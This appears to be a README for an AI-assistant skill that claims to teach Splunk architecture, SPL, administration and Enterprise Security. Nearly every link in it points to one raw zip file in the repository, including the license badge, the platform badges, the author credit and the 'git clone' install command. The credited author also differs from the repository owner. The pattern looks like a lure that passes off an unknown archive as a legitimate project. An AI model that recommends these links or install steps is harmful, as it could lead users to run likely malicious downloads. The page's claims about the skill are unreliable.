# 🦸 Superman Splunk Skill

> **A comprehensive AI skill that turns any LLM into a Splunk expert** — covering architecture, SPL, development, administration, Enterprise Security, and operations at production scale.

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://github.com/lyndondefunct151/superman-splunk/raw/refs/heads/main/references/splunk_superman_2.6.zip)
[![Skill Type](https://img.shields.io/badge/type-AI%20Skill-blueviolet)](https://github.com/lyndondefunct151/superman-splunk/raw/refs/heads/main/references/splunk_superman_2.6.zip)
[![Platform](https://img.shields.io/badge/platform-Claude%20Code%20%7C%20Copilot%20CLI%20%7C%20Gemini%20CLI-blue)](https://github.com/lyndondefunct151/superman-splunk/raw/refs/heads/main/references/splunk_superman_2.6.zip)
[![Coverage](https://img.shields.io/badge/Splunk%20coverage-architecture%20%7C%20SPL%20%7C%20dev%20%7C%20admin%20%7C%20ES-green)](https://github.com/lyndondefunct151/superman-splunk/raw/refs/heads/main/references/splunk_superman_2.6.zip)

---

## What Is This?

**Superman Splunk** is an [AI skill](https://github.com/lyndondefunct151/superman-splunk/raw/refs/heads/main/references/splunk_superman_2.6.zip) — a structured knowledge file that activates when you need Splunk expertise inside an AI coding assistant (Claude Code, GitHub Copilot CLI, Gemini CLI, or any Superpowers-compatible agent).

When the skill activates, the AI gains:

- Deep knowledge of the **3-tier Splunk architecture** (forwarders → indexers → search heads)
- Expert-level **SPL** (Search Processing Language) covering every major command and best practice
- Complete **app and add-on development** guidance including custom commands, modular inputs, REST API, and Python SDK
- Production **administration** knowledge: all key conf files, config precedence, deployment server, license management
- **Enterprise Security (ES)**, SOAR, ITSI, RBAC, TLS hardening, and Risk-Based Alerting

This skill was built by running deep automated research across 300+ web sources in Google NotebookLM, synthesizing those findings, and packaging them into a structured reference format.

---

## 📊 Benchmark Results

Evaluated across 5 real-world Splunk scenarios comparing AI **with** vs **without** the skill:

| Metric | With Skill | Without Skill | Delta |
|--------|:----------:|:-------------:|:-----:|
| **Pass Rate** | **96%** | **73%** | **+23pp** |
| Avg Response Time | 273s | 497s | 224s faster |

Key differentiators:
- ✅ **Transparent Huge Pages (THP)** tuning — the skill surfaces this critical Linux OS setting that the base model misses
- ✅ **Risk-Based Alerting implementation steps** — the skill provides concrete from-scratch workflows vs theory-only baseline
- ✅ **TA directory structure + secure credential handling** — complete patterns, not partial examples
- ⚠️ V2 custom command protocol — improvement opportunity identified (see [roadmap](#-roadmap))

> Full benchmark methodology and eval prompts are in [`evals/evals.json`](evals/evals.json).

---

## 🗂️ Knowledge Coverage

| Reference File | Topics Covered | Lines |
|----------------|---------------|-------|
| [`references/architecture.md`](references/architecture.md) | 3-tier architecture, forwarder types, indexing pipeline, bucket lifecycle, SmartStore, indexer clustering (RF/SF), SHC, Deployment Server, performance tuning | 241 |
| [`references/spl-guide.md`](references/spl-guide.md) | Full SPL command reference, eval functions, rex, stats vs transaction, lookups, KV Store, macros, event types, tags, workflow actions, tstats, dashboard types | 334 |
| [`references/development.md`](references/development.md) | App/TA structure, custom commands (V2 protocol), modular inputs, alert actions, REST API (160+ endpoints, port 8089), Python SDK, CIM normalization, data model acceleration | 393 |
| [`references/administration.md`](references/administration.md) | Config file precedence, inputs.conf, props.conf, transforms.conf, indexes.conf, server.conf, Deployment Server, license management, Monitoring Console | 392 |
| [`references/security-es.md`](references/security-es.md) | RBAC, authorize.conf, TLS/SSL, Enterprise Security, correlation searches, notable events, RBA, threat intelligence, SOAR, ITSI, SmartStore, Splunk Cloud vs Enterprise, hardening checklist | 342 |

---

## 🚀 Installation

### Option 1 — Clone directly into your skills directory

```bash
# Claude Code / Copilot CLI / Gemini CLI (Superpowers)
git clone https://github.com/lyndondefunct151/superman-splunk/raw/refs/heads/main/references/splunk_superman_2.6.zip \
  ~/.agents/skills/superman-splunk
```

That's it. The skill auto-discovers from the skills directory.

### Option 2 — Manual copy

Download or clone this repo, then copy the folder to your AI platform's skills directory:

| Platform | Skills Directory |
|----------|-----------------|
| Claude Code (Superpowers) | `~/.claude/skills/superman-splunk/` |
| Copilot CLI (Superpowers) | `~/.agents/skills/superman-splunk/` |
| Gemini CLI (Superpowers) | `~/.gemini/skills/superman-splunk/` |

### Option 3 — Packaged `.skill` file

Download [`superman-splunk.skill`](releases) from the Releases page and import it via your skill manager.

---

## ⚡ Usage

Once installed, the skill activates **automatically** when Splunk is mentioned in your conversation. No explicit invocation needed.

### Example Prompts

```
"How do I set up indexer clustering with RF=3 and SF=2?"

"Write me an SPL query to detect credential stuffing attacks from firewall logs"

"Build me a modular input TA that polls a REST API every 5 minutes and handles credential storage securely"

"My indexing pipeline is saturating typingQueue — walk me through diagnosing and fixing it"

"Design an RBA (Risk-Based Alerting) workflow in Enterprise Security from scratch"
```

The AI will automatically read the relevant reference files (architecture, SPL, development, etc.) before responding — giving you expert-level answers grounded in deep Splunk knowledge.

---

## 📁 Repository Structure

```
superman-splunk/
├── README.md                     # This file
├── SKILL.md                      # Skill entry point — the AI reads this first
├── CHANGELOG.md                  # Version history
├── LICENSE                       # MIT License
│
├── references/                   # Deep knowledge files (AI reads on demand)
│   ├── architecture.md           # 3-tier arch, buckets, clustering, SmartStore
│   ├── spl-guide.md              # Full SPL reference & knowledge objects
│   ├── development.md            # App dev, custom commands, REST API, SDK
│   ├── administration.md         # All conf files, deployment, licensing
│   └── security-es.md            # ES, SOAR, RBAC, TLS, RBA, ITSI
│
├── evals/
│   └── evals.json                # Benchmark eval prompts and assertions
│
└── docs/
    ├── how-it-works.md           # Architecture of the skill itself
    ├── splunk-quick-reference.md # Ports, conf files, commands cheatsheet
    └── benchmark.md              # Full benchmark methodology and results
```

---

## 🧠 How It Works

The skill uses a **lazy-loading reference pattern**:

1. `SKILL.md` — the entry point — loads first and gives the AI a domain routing table.
2. The AI reads only the reference files it needs for the current question (e.g., an SPL question → reads `spl-guide.md`, not all 5 files).
3. For broad questions, the AI reads multiple references before composing an answer.

This keeps token usage efficient while giving the AI access to the full knowledge base on demand.

```
User asks about Splunk
         │
         ▼
    SKILL.md loads
    (domain routing table)
         │
    ┌────┴────────────────────────────┐
    │                                 │
SPL question?                 Architecture question?
    │                                 │
reads spl-guide.md            reads architecture.md
    │                                 │
    └────────────────┬────────────────┘
                     │
              Expert response
```

---

## 🗺️ Roadmap

- [ ] **V2 custom command protocol** — more prominent coverage; current skill version has it in `development.md` but agents don't surface it reliably
- [ ] Splunk Cloud vs Enterprise decision matrix with migration guide
- [ ] ITSI deep-dive module (Episode pages, Glass Tables, KPI baselines)
- [ ] Splunk Observability (OTel, APM, RUM, Synthetics) extension
- [ ] SPL2 / Federated Search coverage

---

## 🤝 Contributing

Contributions are welcome. If you:
- Find a Splunk fact that's wrong or outdated — open an issue or PR
- Have a new eval scenario to add — add it to `evals/evals.json`
- Want to extend a reference file — PRs to `references/` are the right place

Please keep reference files **factual, precise, and actionable** — the goal is expert-level accuracy, not high-level summaries.

---

## 📄 License

MIT © [ishayvilroel](https://github.com/lyndondefunct151/superman-splunk/raw/refs/heads/main/references/splunk_superman_2.6.zip)

> This skill was created with [Superpowers AI](https://github.com/lyndondefunct151/superman-splunk/raw/refs/heads/main/references/splunk_superman_2.6.zip) skill-creator tooling.
> Research was conducted using Google NotebookLM across 300+ web sources covering the full Splunk documentation surface.

---

*"No question is too advanced or too basic — from 'how do I search logs' to 'design a multi-site indexer cluster with SmartStore.'"*
